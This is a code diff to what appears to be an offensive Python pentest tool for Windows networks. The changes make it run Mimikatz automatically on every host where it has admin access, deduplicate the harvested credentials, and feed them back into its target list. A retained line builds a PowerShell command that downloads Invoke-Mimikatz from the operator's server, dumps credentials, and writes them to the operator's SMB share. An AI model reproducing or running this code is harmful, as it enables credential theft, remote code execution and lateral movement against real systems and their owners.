@@ -2453,7 +2453,8 @@ def runMimikatz(targetIP,domain,username,password,passwordHash):
                         tmpDomain=(x[0]).lower()
                         tmpUsername=(x[1]).lower()
                         tmpPassword=x[2]
-                        tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+                        if [targetIP,tmpDomain,tmpUsername,tmpPassword] not in tmpPasswordList1:
+                            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
             else:        
                 if obfuscatedMode==False:           
                     cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_mimikatz.txt"    
@@ -2536,7 +2537,8 @@ def runMimikatz(targetIP,domain,username,password,passwordHash):
             tmpDomain=(x[0]).lower()
             tmpUsername=(x[1]).lower()
             tmpPassword=(x[2])
-            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+            if [targetIP,tmpDomain,tmpUsername,tmpPassword] not in tmpPasswordList1:
+                tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
     return tmpPasswordList1
 
 def get_ip_address():
@@ -4455,7 +4457,6 @@ def accessRemoteShare(targetIP,filePath,domain, username, password):
             conn.connect(targetIP, 445)  
             shareName=filePath.split("/")[0]
             subDirectory=filePath.replace(shareName,"")
-            conn.listPath(shareName, subDirectory)
             conn = None
             complete=True
             status=True
@@ -5435,6 +5436,22 @@ if args.module=='shares':
                 print "No suitable hosts found"
         else:
             print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
+
+        for x in accessAdmHostList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)
+            for y in tmpPasswordList:
+                accessAdmHostList.append(y)
+        for x in accessAdmHostList:            
+            print x
 
         for x in accessAdmHostList:            
             headers = ["IP", "Share/File","Status","Credentials"]
